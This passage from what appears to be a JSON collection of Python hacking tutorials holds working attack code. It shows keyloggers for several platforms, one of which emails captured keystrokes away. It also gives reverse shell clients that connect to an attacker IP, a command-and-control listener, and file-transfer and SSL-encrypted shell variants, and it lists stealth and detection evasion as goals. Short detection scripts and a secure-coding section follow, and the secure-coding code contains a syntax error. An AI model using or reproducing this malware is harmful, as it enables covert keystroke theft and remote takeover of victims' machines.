msg['Subject'] = \"Keylogger Report\"\n            \n            msg.attach(MIMEText(message, 'plain'))\n            \n            server.sendmail(self.email_address, self.send_to, msg.as_string())\n            server.quit()\n        except Exception as e:\n            print(f\"Email error: {e}\")\n    \n    def report(self):\n        if self.log:\n            self.send_email(self.log)\n        self.log = \"\"\n        timer = threading.Timer(self.email_interval, self.report)\n        timer.start()\n    \n    def start(self):\n        # Start email reporting thread\n        email_thread = threading.Timer(self.email_interval, self.report)\n        email_thread.start()\n        \n        # Start keylogger\n        with Listener(on_press=self.callback) as listener:\n            listener.join()\n\n# Usage (educational purposes only)\n# keylogger = AdvancedKeylogger()\n# keylogger.start()\n```\n\n3. Windows-Specific Keylogger:\n\nPlatform-Specific Implementation:\n```python\n# Windows keylogger using pywin32\ntry:\n    import win32api\n    import win32console\n    import win32gui\n    import pythoncom, pyHook\nexcept ImportError:\n    print(\"pywin32 and pyHook required for Windows keylogger\")\n    exit()\n\nclass WindowsKeylogger:\n    def __init__(self):\n        self.log_file = \"windows_keylog.txt\"\n        self.current_window = None\n    \n    def get_current_window(self):\n        try:\n            window = win32gui.GetWindowText(win32gui.GetForegroundWindow())\n            if window != self.current_window:\n                self.current_window = window\n                with open(self.log_file, 'a') as f:\n                    f.write(f\"\\n[{window}]\\n\")\n        except:\n            pass\n    \n    def key_pressed(self, event):\n        if event.Ascii > 32 and event.Ascii < 127:\n            self.get_current_window()\n            with open(self.log_file, 'a') as f:\n                f.write(chr(event.Ascii))\n        elif event.Ascii == 13:  # Enter\n            self.get_current_window()\n            with open(self.log_file, 'a') as f:\n                f.write('\\n')\n        elif event.Ascii == 8:   # Backspace\n            self.get_current_window()\n            with open(self.log_file, 'a') as f:\n                f.write('[BACKSPACE]')\n        \n        return True\n    \n    def start(self):\n        obj = pyHook.HookManager()\n        obj.KeyDown = self.key_pressed\n        obj.HookKeyboard()\n        pythoncom.PumpMessages()\n\n# Usage (Windows only)\n# keylogger = WindowsKeylogger()\n# keylogger.start()\n```\n\n4. Linux Keylogger:\n\nX11 Event Monitoring:\n```python\n# Linux keylogger using Xlib\ntry:\n    from Xlib import X, XK, display\n    from Xlib.ext import record\n    from Xlib.protocol import rq\nexcept ImportError:\n    print(\"python-xlib required for Linux keylogger\")\n    exit()\n\nclass LinuxKeylogger:\n    def __init__(self):\n        self.log_file = \"linux_keylog.txt\"\n        self.disp = None\n    \n    def key_press(self, event):\n        keysym = self.disp.keycode_to_keysym(event.detail, 0)\n        char = XK.keysym_to_string(keysym)\n        \n        if char:\n            with open(self.log_file, 'a') as f:\n                f.write(char)\n        elif keysym == XK.XK_Return:\n            with open(self.log_file, 'a') as f:\n                f.write('\\n')\n        elif keysym == XK.XK_space:\n            with open(self.log_file, 'a') as f:\n                f.write(' ')\n        elif keysym == XK.XK_BackSpace:\n            with open(self.log_file, 'a') as f:\n                f.write('[BACKSPACE]')\n    \n    def start(self):\n        self.disp = display.Display()\n        \n        # Create record context\n        ctx = self.disp.record_create_context(\n            0,\n            [record.AllClients],\n            [{\n                'core_requests': (0, 0),\n                'core_replies': (0, 0),\n                'ext_requests': (0, 0, 0, 0),\n                'ext_replies': (0, 0, 0, 0),\n                'delivered_events': (0, 0),\n                'device_events': (X.KeyPress, X.KeyPress),\n                'errors': (0, 0),\n                'client_started': False,\n                'client_died': False,\n            }]\n        )\n        \n        self.disp.record_enable_context(ctx, self.key_press)\n        self.disp.record_free_context(ctx)\n        \n        while True:\n            # Event loop\n            event = self.disp.next_event()\n\n# Usage (Linux with X11 only)\n# keylogger = LinuxKeylogger()\n# keylogger.start()\n```\n\n5. Keylogger Detection and Prevention:\n\nSecurity Measures:\n```python\n# Anti-keylogger techniques\nimport psutil\nimport os\n\nclass KeyloggerDetector:\n    def __init__(self):\n        self.suspicious_processes = [\n            'keylogger', 'logger', 'spy', 'monitor',\n            'hook', 'record', 'capture'\n        ]\n    \n    def check_processes(self):\n        suspicious = []\n        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):\n            try:\n                name = proc.info['name'].lower()\n                cmdline = ' '.join(proc.info['cmdline'] or []).lower()\n                \n                for keyword in self.suspicious_processes:\n                    if keyword in name or keyword in cmdline:\n                        suspicious.append(proc.info)\n            except (psutil.NoSuchProcess, psutil.AccessDenied):\n                continue\n        \n        return suspicious\n    \n    def check_files(self, directories):\n        suspicious_files = []\n        \n        for directory in directories:\n            if os.path.exists(directory):\n                for root, dirs, files in os.walk(directory):\n                    for file in files:\n                        if 'keylog' in file.lower() or 'logger' in file.lower():\n                            suspicious_files.append(os.path.join(root, file))\n        \n        return suspicious_files\n    \n    def run_security_check(self):\n        print(\"Checking for keyloggers...\")\n        \n        # Check processes\n        suspicious_procs = self.check_processes()\n        if suspicious_procs:\n            print(\"Suspicious processes found:\")\n            for proc in suspicious_procs:\n                print(f\"  {proc}\")\n        \n        # Check common directories\n        dirs_to_check = ['/tmp', '/var/tmp', os.path.expanduser('~')]\n        suspicious_files = self.check_files(dirs_to_check)\n        if suspicious_files:\n            print(\"Suspicious files found:\")\n            for file in suspicious_files:\n                print(f\"  {file}\")\n        \n        if not suspicious_procs and not suspicious_files:\n            print(\"No obvious keyloggers detected\")\n\n# Usage\ndetector = KeyloggerDetector()\ndetector.run_security_check()\n```\n\nWHAT TO LOOK FOR:\n- **Cross-Platform Compatibility**: Windows vs Linux vs macOS\n- **Stealth Operation**: Avoiding detection by security software\n- **Data Exfiltration**: Secure transmission of captured data\n- **Resource Usage**: Minimal system impact\n- **Error Handling**: Robust operation under various conditions\n- **Ethical Use**: Educational and authorized testing only\n\nSECURITY IMPLICATIONS:\n- **Input Interception Risks**: Keystroke monitoring threats\n- **Credential Theft**: Password and sensitive data capture\n- **Privacy Violations**: Unauthorized activity monitoring\n- **Malware Analysis**: Understanding keylogger behavior\n- **Endpoint Protection**: Detection and prevention strategies\n- **Forensic Investigation**: Keylogger evidence collection\n\nCOMMON PITFALLS:\n- **Detection by Antivirus**: Signature-based identification\n- **System Performance Impact**: Resource consumption\n- **Data Transmission Security**: Intercepted log transmission\n- **Legal Issues**: Unauthorized monitoring\n- **False Positives**: Legitimate monitoring tools\n- **Platform Limitations**: OS-specific implementation requirements\n\nTOOLS REFERENCE:\n- **pynput**: Cross-platform input monitoring\n- **pywin32**: Windows system API access\n- **pyHook**: Windows keyboard hooking\n- **python-xlib**: Linux X11 event handling\n- **psutil**: System process monitoring\n- **smtplib**: Email transmission for logs\n\nFURTHER READING:\n- Keyboard Input Interception: OS-level hooking techniques\n- Malware Analysis: Keylogger reverse engineering\n- Endpoint Detection: Security monitoring strategies\n- Privacy Protection: Anti-keylogger technologies\n- Digital Forensics: Keylogger evidence analysis\n- Ethical Monitoring: Legal surveillance practices",
      "tags": ["python", "keylogger", "monitoring", "input-capture", "security"]
    },
    {
      "id": "reverse_shell_guide",
      "title": "Python Reverse Shell Implementation",
      "content": "OBJECTIVE: Create Python reverse shell scripts for remote access and understand shell connection techniques.\n\nACADEMIC BACKGROUND:\nReverse shells establish connections from compromised systems back to attacker-controlled machines, bypassing firewall restrictions. Understanding reverse shell implementation helps security professionals identify and prevent such attack vectors.\n\nSTEP-BY-STEP PROCESS:\n\n1. Basic Reverse Shell:\n\nSimple TCP Reverse Connection:\n```python\nimport socket\nimport subprocess\nimport os\n\nclass ReverseShell:\n    def __init__(self, host, port):\n        self.host = host\n        self.port = port\n        self.socket = None\n    \n    def connect(self):\n        try:\n            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            self.socket.connect((self.host, self.port))\n            print(f\"Connected to {self.host}:{self.port}\")\n            return True\n        except Exception as e:\n            print(f\"Connection failed: {e}\")\n            return False\n    \n    def execute_command(self, command):\n        try:\n            # Execute command and capture output\n            output = subprocess.run(\n                command,\n                shell=True,\n                capture_output=True,\n                text=True\n            )\n            \n            # Combine stdout and stderr\n            result = output.stdout + output.stderr\n            if not result:\n                result = \"Command executed successfully\\n\"\n            \n            return result\n        except Exception as e:\n            return f\"Error executing command: {e}\\n\"\n    \n    def run(self):\n        if not self.connect():\n            return\n        \n        # Send initial connection message\n        self.socket.send(b\"Reverse shell connected\\n\")\n        \n        while True:\n            try:\n                # Receive command from server\n                command = self.socket.recv(1024).decode().strip()\n                \n                if not command:\n                    break\n                \n                if command.lower() == 'exit':\n                    self.socket.send(b\"Exiting...\\n\")\n                    break\n                \n                # Execute command\n                result = self.execute_command(command)\n                \n                # Send result back\n                self.socket.send(result.encode())\n                \n            except Exception as e:\n                print(f\"Error: {e}\")\n                break\n        \n        self.socket.close()\n\n# Usage (client side - run on target)\nif __name__ == \"__main__\":\n    # Replace with attacker's IP and port\n    shell = ReverseShell(\"192.168.1.100\", 4444)\n    shell.run()\n```\n\n2. Reverse Shell Server:\n\nCommand and Control Server:\n```python\nimport socket\nimport threading\nimport sys\n\nclass ShellServer:\n    def __init__(self, host='0.0.0.0', port=4444):\n        self.host = host\n        self.port = port\n        self.server_socket = None\n        self.client_socket = None\n        self.client_address = None\n    \n    def start_server(self):\n        try:\n            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n            self.server_socket.bind((self.host, self.port))\n            self.server_socket.listen(1)\n            print(f\"Listening on {self.host}:{self.port}\")\n            \n            self.client_socket, self.client_address = self.server_socket.accept()\n            print(f\"Connection from {self.client_address}\")\n            \n            return True\n        except Exception as e:\n            print(f\"Server error: {e}\")\n            return False\n    \n    def handle_client(self):\n        while True:\n            try:\n                # Get command from user\n                command = input(\"shell> \")\n                \n                if command.lower() in ['exit', 'quit']:\n                    self.client_socket.send(b\"exit\")\n                    break\n                \n                # Send command to client\n                self.client_socket.send(command.encode() + b\"\\n\")\n                \n                # Receive response\n                response = self.client_socket.recv(4096).decode()\n                print(response, end='')\n                \n            except KeyboardInterrupt:\n                print(\"\\nClosing connection...\")\n                self.client_socket.send(b\"exit\")\n                break\n            except Exception as e:\n                print(f\"Error: {e}\")\n                break\n        \n        self.client_socket.close()\n        self.server_socket.close()\n    \n    def run(self):\n        if self.start_server():\n            self.handle_client()\n\n# Usage (server side - run on attacker machine)\nif __name__ == \"__main__\":\n    server = ShellServer()\n    server.run()\n```\n\n3. Advanced Reverse Shell Features:\n\nEnhanced Remote Access:\n```python\nimport socket\nimport subprocess\nimport os\nimport platform\nimport getpass\n\nclass AdvancedReverseShell:\n    def __init__(self, host, port):\n        self.host = host\n        self.port = port\n        self.socket = None\n        self.system_info = self.get_system_info()\n    \n    def get_system_info(self):\n        \"\"\"Gather basic system information\"\"\"\n        try:\n            info = {\n                'os': platform.system(),\n                'hostname': socket.gethostname(),\n                'user': getpass.getuser(),\n                'cwd': os.getcwd()\n            }\n            return info\n        except:\n            return {'error': 'Could not gather system info'}\n    \n    def change_directory(self, path):\n        \"\"\"Change working directory\"\"\"\n        try:\n            os.chdir(path)\n            return f\"Changed directory to {os.getcwd()}\\n\"\n        except Exception as e:\n            return f\"Error changing directory: {e}\\n\"\n    \n    def upload_file(self, filename):\n        \"\"\"Receive file from server\"\"\"\n        try:\n            self.socket.send(b\"Ready to receive file\\n\")\n            \n            with open(filename, 'wb') as f:\n                while True:\n                    data = self.socket.recv(1024)\n                    if b\"EOF\" in data:\n                        f.write(data.replace(b\"EOF\", b\"\"))\n                        break\n                    f.write(data)\n            \n            return f\"File {filename} uploaded successfully\\n\"\n        except Exception as e:\n            return f\"Error uploading file: {e}\\n\"\n    \n    def download_file(self, filename):\n        \"\"\"Send file to server\"\"\"\n        try:\n            if os.path.exists(filename):\n                self.socket.send(b\"Sending file...\\n\")\n                \n                with open(filename, 'rb') as f:\n                    while True:\n                        data = f.read(1024)\n                        if not data:\n                            break\n                        self.socket.send(data)\n                \n                self.socket.send(b\"EOF\")\n                return f\"File {filename} sent successfully\\n\"\n            else:\n                return f\"File {filename} not found\\n\"\n        except Exception as e:\n            return f\"Error downloading file: {e}\\n\"\n    \n    def execute_command(self, command):\n        \"\"\"Execute shell command with enhanced features\"\"\"\n        try:\n            # Handle special commands\n            if command.startswith('cd '):\n                path = command[3:].strip()\n                return self.change_directory(path)\n            elif command.startswith('upload '):\n                filename = command[7:].strip()\n                return self.upload_file(filename)\n            elif command.startswith('download '):\n                filename = command[9:].strip()\n                return self.download_file(filename)\n            elif command == 'sysinfo':\n                return f\"System Info: {self.system_info}\\n\"\n            \n            # Execute regular command\n            if self.system_info['os'] == 'Windows':\n                output = subprocess.run(\n                    command,\n                    shell=True,\n                    capture_output=True,\n                    text=True\n                )\n            else:\n                # Use bash for Unix-like systems\n                output = subprocess.run(\n                    ['bash', '-c', command],\n                    capture_output=True,\n                    text=True\n                )\n            \n            result = output.stdout\n            if output.stderr:\n                result += output.stderr\n            \n            if not result:\n                result = \"Command executed\\n\"\n            \n            return result\n        except Exception as e:\n            return f\"Error: {e}\\n\"\n    \n    def run(self):\n        # Connection and main loop (similar to basic version)\n        # ... implementation ...\n        pass\n\n# Usage\nshell = AdvancedReverseShell(\"192.168.1.100\", 4444)\nshell.run()\n```\n\n4. Encrypted Reverse Shell:\n\nSecure Communication Channel:\n```python\nimport socket\nimport ssl\nimport subprocess\n\nclass EncryptedReverseShell:\n    def __init__(self, host, port, cert_file=None):\n        self.host = host\n        self.port = port\n        self.cert_file = cert_file\n    \n    def create_ssl_context(self):\n        \"\"\"Create SSL context for encrypted communication\"\"\"\n        context = ssl.create_default_context()\n        \n        if self.cert_file:\n            context.load_cert_chain(certfile=self.cert_file)\n        else:\n            # Skip certificate verification for self-signed certs\n            context.check_hostname = False\n            context.verify_mode = ssl.CERT_NONE\n        \n        return context\n    \n    def connect(self):\n        try:\n            # Create regular socket\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.connect((self.host, self.port))\n            \n            # Wrap with SSL\n            context = self.create_ssl_context()\n            self.ssl_socket = context.wrap_socket(sock, server_hostname=self.host)\n            \n            print(f\"SSL connection established to {self.host}:{self.port}\")\n            return True\n        except Exception as e:\n            print(f\"SSL connection failed: {e}\")\n            return False\n    \n    def execute_command(self, command):\n        # Similar to previous implementation but using ssl_socket\n        try:\n            output = subprocess.run(\n                command,\n                shell=True,\n                capture_output=True,\n                text=True\n            )\n            return output.stdout + output.stderr\n        except Exception as e:\n            return f\"Error: {e}\\n\"\n    \n    def run(self):\n        if not self.connect():\n            return\n        \n        while True:\n            try:\n                command = self.ssl_socket.recv(1024).decode().strip()\n                \n                if not command or command.lower() == 'exit':\n                    break\n                \n                result = self.execute_command(command)\n                self.ssl_socket.send(result.encode())\n                \n            except Exception as e:\n                print(f\"Error: {e}\")\n                break\n        \n        self.ssl_socket.close()\n\n# Usage\nshell = EncryptedReverseShell(\"192.168.1.100\", 4444)\nshell.run()\n```\n\n5. Reverse Shell Detection and Prevention:\n\nSecurity Measures:\n```python\nimport psutil\nimport socket\nimport subprocess\n\nclass ShellDetector:\n    def __init__(self):\n        self.suspicious_ports = [4444, 5555, 6666, 7777, 8888, 9999]\n        self.suspicious_processes = ['nc', 'ncat', 'socat', 'bash', 'sh']\n    \n    def check_listening_ports(self):\n        \"\"\"Check for suspicious listening ports\"\"\"\n        suspicious = []\n        \n        for conn in psutil.net_connections():\n            if conn.status == 'LISTEN' and conn.laddr.port in self.suspicious_ports:\n                suspicious.append({\n                    'port': conn.laddr.port,\n                    'pid': conn.pid,\n                    'status': 'listening'\n                })\n        \n        return suspicious\n    \n    def check_outbound_connections(self):\n        \"\"\"Check for suspicious outbound connections\"\"\"\n        suspicious = []\n        \n        for conn in psutil.net_connections():\n            if conn.status == 'ESTABLISHED' and conn.raddr:\n                remote_port = conn.raddr.port\n                if remote_port in self.suspicious_ports:\n                    try:\n                        process = psutil.Process(conn.pid)\n                        suspicious.append({\n                            'remote_ip': conn.raddr.ip,\n                            'remote_port': remote_port,\n                            'pid': conn.pid,\n                            'process': process.name(),\n                            'cmdline': ' '.join(process.cmdline())\n                        })\n                    except:\n                        pass\n        \n        return suspicious\n    \n    def check_processes(self):\n        \"\"\"Check for suspicious processes\"\"\"\n        suspicious = []\n        \n        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):\n            try:\n                name = proc.info['name']\n                cmdline = ' '.join(proc.info['cmdline'] or [])\n                \n                # Check for reverse shell indicators\n                if (name in self.suspicious_processes and \n                    ('socket' in cmdline or '/dev/tcp' in cmdline or 'bash -i' in cmdline)):\n                    suspicious.append(proc.info)\n                \n            except (psutil.NoSuchProcess, psutil.AccessDenied):\n                continue\n        \n        return suspicious\n    \n    def run_security_check(self):\n        print(\"Checking for reverse shells...\")\n        \n        # Check listening ports\n        listening = self.check_listening_ports()\n        if listening:\n            print(\"Suspicious listening ports:\")\n            for item in listening:\n                print(f\"  Port {item['port']} (PID: {item['pid']})\")\n        \n        # Check outbound connections\n        outbound = self.check_outbound_connections()\n        if outbound:\n            print(\"Suspicious outbound connections:\")\n            for item in outbound:\n                print(f\"  {item['remote_ip']}:{item['remote_port']} (PID: {item['pid']})\")\n        \n        # Check processes\n        processes = self.check_processes()\n        if processes:\n            print(\"Suspicious processes:\")\n            for proc in processes:\n                print(f\"  {proc['name']} (PID: {proc['pid']})\")\n        \n        if not listening and not outbound and not processes:\n            print(\"No obvious reverse shells detected\")\n\n# Usage\ndetector = ShellDetector()\ndetector.run_security_check()\n```\n\nWHAT TO LOOK FOR:\n- **Connection Establishment**: Reliable socket connections\n- **Command Execution**: Safe subprocess handling\n- **Error Handling**: Robust exception management\n- **Platform Compatibility**: Windows vs Unix command execution\n- **Security Features**: Encryption and access controls\n- **Detection Evasion**: Avoiding security monitoring\n\nSECURITY IMPLICATIONS:\n- **Remote Access Risks**: Unauthorized system control\n- **Firewall Bypass**: Outbound connection exploitation\n- **Data Exfiltration**: Sensitive information theft\n- **Persistence Mechanisms**: Maintaining access\n- **Lateral Movement**: Network compromise spread\n- **Command and Control**: Attacker communication channels\n\nCOMMON PITFALLS:\n- **Connection Stability**: Unreliable network conditions\n- **Detection by IDS**: Signature-based identification\n- **Resource Limitations**: System resource constraints\n- **Platform Differences**: OS-specific command execution\n- **Security Software**: Antivirus and endpoint protection\n- **Legal Issues**: Unauthorized remote access\n\nTOOLS REFERENCE:\n- **socket**: Network communication\n- **subprocess**: System command execution\n- **ssl**: Secure socket layer encryption\n- **psutil**: System process monitoring\n- **platform**: Operating system detection\n- **getpass**: User information retrieval\n\nFURTHER READING:\n- Remote Access Techniques: Shell connection methods\n- Network Security: Firewall and IDS evasion\n- Malware Analysis: Reverse shell investigation\n- Command and Control: C2 server architectures\n- Digital Forensics: Shell connection evidence\n- Ethical Hacking: Authorized penetration testing",
      "tags": ["python", "reverse-shell", "remote-access", "command-control", "networking"]
    },
    {
      "id": "python_security_considerations",
      "title": "Security Considerations for Python Scripts",
      "content": "OBJECTIVE: Understand security best practices for Python penetration testing scripts and avoid common vulnerabilities.\n\nACADEMIC BACKGROUND:\nPython scripts used in penetration testing can introduce security risks if not properly designed. Understanding secure coding practices helps create safe tools that don't compromise systems or leak sensitive information.\n\nSTEP-BY-STEP PROCESS:\n\n1. Input Validation and Sanitization:\n\nSecure Input Handling:\n```python\nimport re\n\nclass SecureInputHandler:\n    def __init__(self):\n        # Define allowed patterns\n        self.ip_pattern = re.compile(r'^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$')\n        self.domain_pattern = re.compile(r'^[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$')\n        self.path_pattern = re.compile(r'^[a-zA-Z0-9._/-]+$')\n    \n    def validate_ip(self, ip):\n        \"\"\"Validate IP address format and range\"\"\"\n        if not self.ip_pattern.match(ip):\n            return False\n        \n        # Check each octet is 0-255\n        octets = ip.split('.')\n        for octet in octets:\n            if not 0 <= int(octet) <= 255:\n                return False\n        \n        return True\n    \n    def validate_domain(self, domain):\n        \"\"\"Basic domain validation\"\"\"\n        if not self.domain_pattern.match(domain):\n            return False\n        \n        # Additional checks\n        if '..' in domain or domain.startswith('-'):\n            return False\n        \n        return True\n    \n    def sanitize_filename(self, filename):\n        \"\"\"Remove dangerous characters from filenames\"\"\"\n        # Remove path traversal attempts\n        filename = filename.replace('../', '')\n        filename = filename.replace('..\\\\', '')\n        \n        # Remove other dangerous characters\n        dangerous = ['<', '>', ':', '\"', '|', '?', '*']\n        for char in dangerous:\n            filename = filename.replace(char, '')\n        \n        return filename\n    \n    def validate_port(self, port):\n        \"\"\"Validate port number\"\"\"\n        try:\n            port_num = int(port)\n            return 1 <= port_num <= 65535\n        except ValueError:\n            return False\n\n# Usage\nvalidator = SecureInputHandler()\n\n# Validate inputs\nif validator.validate_ip(\"192.168.1.1\"):\n    print(\"Valid IP\")\n\nif validator.validate_port(\"80\"):\n    print(\"Valid port\")\n\nsafe_filename = validator.sanitize_filename(\"../../../etc/passwd\")\nprint(f\"Safe filename: {safe_filename}\")\n```\n\n2. Secure File Operations:\n\nSafe File Handling:\n```python\nimport os\nimport tempfile\n\nclass SecureFileHandler:\n    def __init__(self, base_dir=None):\n        self.base_dir = base_dir or os.getcwd()\n        self.allowed_extensions = ['.txt', '.log', '.csv', '.json']\n    \n    def is_safe_path(self, filepath):\n        \"\"\"Check if filepath is within allowed directory\"\"\"\n        # Resolve absolute path\n        abs_path = os.path.abspath(filepath)\n        base_abs = os.path.abspath(self.base_dir)\n        \n        # Check if path starts with base directory\n        return abs_path.startswith(base_abs)\n    \n    def validate_extension(self, filename):\n        \"\"\"Check file extension is allowed\"\"\"\n        _, ext = os.path.splitext(filename)\n        return ext.lower() in self.allowed_extensions\n    \n    def secure_read(self, filepath):\n        \"\"\"Safely read file with validation\"\"\"\n        if not self.is_safe_path(filepath):\n            raise ValueError(\"Path traversal attempt detected\")\n        \n        if not os.path.exists(filepath):\n            raise FileNotFoundError(f\"File not found: {filepath})}\n        \n        if not self.validate_extension(filepath):\n            raise ValueError(\"File type not allowed\")\n        \n        try:\n            with open(filepath, 'r', encoding='utf-8') as f:\n                return f.read()\n        except UnicodeDecodeError:\n            raise ValueError(\"File encoding not supported\")\n    \n    def secure_write(self, filepath, content):\n        \"\"\"Safely write file with validation\"\"\"\n        if not self.is_safe_path(filepath):\n            raise ValueError(\"Path traversal attempt detected\")\n        \n        # Create directory if it doesn't exist\n        os.makedirs(os.path.dirname(filepath), exist_ok=True)\n        \n        # Write to temporary file first\n        temp_fd, temp_path = tempfile.mkstemp(dir=os.path.dirname(filepath))\n        try:\n            with os.fdopen(temp_fd, 'w') as temp_file:\n                temp_file.write(content)\n            \n            # Atomic move to final location\n            os.rename(temp_path, filepath)\n        except:\n            # Clean up temp file on error\n            os.unlink(temp_path)\n            raise\n\n# Usage\nfile_handler = SecureFileHandler()\n\ntry:\n    content = file_handler.secure_read(\"safe_file.txt\")\n    file_handler.secure_write(\"output.txt\", \"Safe content\")\nexcept ValueError as e:\n    print(f\"Security error: {e}\")\n```\n\n3. Secure Network Communications:\n\nSafe Socket Programming:\n```python\nimport socket\nimport ssl\nimport time\n\nclass SecureNetworkClient:\n    def __init__(self, timeout=10):\n        self.timeout = timeout\n        self.max_retries = 3\n    \n    def create_secure_socket(self, host, port):\n        \"\"\"Create SSL-wrapped socket\"\"\"\n        context = ssl.create_default_context()\n        context.check_hostname = True\n        context.verify_mode = ssl.CERT_REQUIRED\n        \n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(self.timeout)\n        \n        secure_sock = context.wrap_socket(sock, server_hostname=host)\n        return secure_sock\n    \n    def safe_connect(self, host, port):\n        \"\"\"Connect with retry logic and validation\"\"\"\n        if not self.validate_host(host):\n            raise ValueError(\"Invalid hostname\")\n        \n        for attempt in range(self.max_retries):\n            try:\n                sock = self.create_secure_socket(host, port)\n                sock.connect((host, port))\n                return sock\n            except (socket.timeout, socket.error) as e:\n                if attempt == self.max_retries - 1:\n                    raise\n                time.sleep(2 ** attempt)  # Exponential backoff\n        \n        raise ConnectionError(\"Failed to connect after retries\")\n    \n    def validate_host(self, host):\n        \"\"\"Basic host validation\"\"\"\n        # Prevent IP injection\n        if any(char in host for char in [';', '&', '|', '`']):\n            return False\n        \n        # Check length\n        if len(host) > 253:\n            return False\n        \n        return True\n    \n    def safe_send_receive(self, sock, data):\n        \"\"\"Send and receive with size limits\"\"\"\n        max_size = 8192  # 8KB limit\n        \n        # Send data\n        sock.send(data.encode())\n        \n        # Receive with timeout and size limit\n        chunks = []\n        total_size = 0\n        \n        while total_size < max_size:\n            try:\n                chunk = sock.recv(1024)\n                if not chunk:\n                    break\n                chunks.append(chunk)\n                total_size += len(chunk)\n            except socket.timeout:\n                break\n        \n        return b''.join(chunks).decode('utf-8', errors='ignore')\n\n# Usage\nclient = SecureNetworkClient()\n\ntry:\n    sock = client.safe_connect(\"example.com\", 443)\n    response = client.safe_send_receive(sock, \"GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n\")\n    sock.close()\nexcept Exception as e:\n    print(f\"Network error: {e}\")\n```\n\n4. Credential Management:\n\nSecure Password Handling:\n```python\nimport secrets\nimport hashlib\nimport hmac\nimport os\n\nclass SecureCredentialManager:\n    def __init__(self):\n        self.key = self.generate_key()\n    \n    def generate_key(self):\n        \"\"\"Generate cryptographically secure key\"\"\"\n        return secrets.token_bytes(32)\n    \n    def hash_password(self, password):\n        \"\"\"Secure password hashing with salt\"\"\"\n        salt = secrets.token_bytes(16)\n        \n        # Use PBKDF2 with high iterations\n        key = hashlib.pbkdf2_hmac(\n            'sha256',\n            password.encode(),\n            salt,\n            100000  # High iteration count\n        )\n        \n        # Store salt with hash\n        return salt + key\n    \n    def verify_password(self, password, stored_hash):\n        \"\"\"Verify password against stored hash\"\"\"\n        salt = stored_hash[:16]\n        key = stored_hash[16:]\n        \n        test_key = hashlib.pbkdf2_hmac(\n            'sha256',\n            password.encode(),\n            salt,\n            100000\n        )\n        \n        # Use constant-time comparison\n        return hmac.compare_digest(key, test_key)\n    \n    def generate_token(self):\n        \"\"\"Generate secure random token\"\"\"\n        return secrets.token_urlsafe(32)\n    \n    def secure_random_choice(self, choices):\n        \"\"\"Secure random selection\"\"\"\n        return secrets.choice(choices)\n    \n    def encrypt_data(self, data):\n        \"\"\"Simple symmetric encryption (for demo)\"\"\"\n        # In production, use proper encryption libraries\n        # This is simplified for educational purposes\n        import cryptography.fernet\n        \n        f = cryptography.fernet.Fernet(self.key)\n        return f.encrypt(data.encode())\n    \n    def decrypt_data(self, encrypted_data):\n        \"\"\"Decrypt data\"\"\"\n        import cryptography.fernet\n        \n        f = cryptography.fernet.Fernet(self.key)\n        return f.decrypt(encrypted_data).decode()\n\n# Usage\ncred_manager = SecureCredentialManager()\n\n# Hash password\nhashed = cred_manager.hash_password(\"MySecurePassword123!\")\n\n# Verify password\nis_valid = cred_manager.verify_password(\"MySecurePassword123!\", hashed)\nprint(f\"Password valid: {is_valid}\")\n\n# Generate secure token\ntoken = cred_manager.generate_token()\nprint(f\"Secure token: {token}\")\n```\n\n5. Logging and Error Handling:\n\nSecure Logging Practices:\n```python\nimport logging\nimport logging.handlers\nimport sys\n\nclass SecureLogger:\n    def __init__(self, log_file=\"security.log\", max_size=10485760):  # 10MB\n        self.setup_logger(log_file, max_size)\n    \n    def setup_logger(self, log_file, max_size):\n        \"\"\"Setup secure logging configuration\"\"\"\n        self.logger = logging.getLogger('security')\n        self.logger.setLevel(logging.INFO)\n        \n        # Rotating file handler\n        handler = logging.handlers.RotatingFileHandler(\n            log_file,\n            maxBytes=max_size,\n            backupCount=5\n        )\n        \n        # Secure formatter (no sensitive data)\n        formatter = logging.Formatter(\n            '%(asctime)s - %(levelname)s - %(message)s',\n            datefmt='%Y-%m-%d %H:%M:%S'\n        )\n        handler.setFormatter(formatter)\n        \n        self.logger.addHandler(handler)\n        \n        # Also log to console for development\n        console_handler = logging.StreamHandler(sys.stdout)\n        console_handler.setFormatter(formatter)\n        self.logger.addHandler(console_handler)\n    \n    def log_security_event(self, event_type, details, sensitive=False):\n        \"\"\"Log security events safely\"\"\"\n        if sensitive:\n            # Sanitize sensitive information\n            details = self.sanitize_sensitive_data(details)\n        \n        if event_type == 'auth_success':\n            self.logger.info(f\"Authentication successful: {details}\")\n        elif event_type == 'auth_failure':\n            self.logger.warning(f\"Authentication failed: {details}\")\n        elif event_type == 'suspicious_activity':\n            self.logger.error(f\"Suspicious activity detected: {details}\")\n        else:\n            self.logger.info(f\"Security event: {event_type} - {details}\")\n    \n    def sanitize_sensitive_data(self, data):\n        \"\"\"Remove or mask sensitive information\"\"\"\n        import re\n        \n        # Mask passwords\n        data = re.sub(r'password[=:][^\\s]+', 'password=***', data, flags=re.IGNORECASE)\n        \n        # Mask API keys\n        data = re.sub(r'api[_-]?key[=:][^\\s]+', 'api_key=***', data, flags=re.IGNORECASE)\n        \n        # Mask credit cards\n        data = re.sub(r'\\b\\d{4}[ -]?\\d{4}[ -]?\\d{4}[ -]?\\d{4}\\b', '****-****-****-****', data)\n        \n        return data\n    \n    def log_error(self, error, context=None):\n        \"\"\"Log errors without exposing sensitive information\"\"\"\n        safe_error = str(error)\n        \n        # Remove file paths that might contain sensitive info\n        safe_error = re.sub(r'/home/[^\\s]+', '/home/user', safe_error)\n        safe_error = re.sub(r'C:\\\\Users\\\\[^\\\\]+', 'C:\\\\Users\\\\user', safe_error)\n        \n        if context:\n            self.logger.error(f\"Error in {context}: {safe_error}\")\n        else:\n            self.logger.error(f\"Error: {safe_error}\")\n\n# Usage\nlogger = SecureLogger()\n\nlogger.log_security_event('auth_success', 'user: admin')\nlogger.log_security_event('auth_failure', 'user: admin, ip: 192.168.1.100')\nlogger.log_security_event('suspicious_activity', 'Multiple failed login attempts from 192.168.1.100')\n\ntry:\n    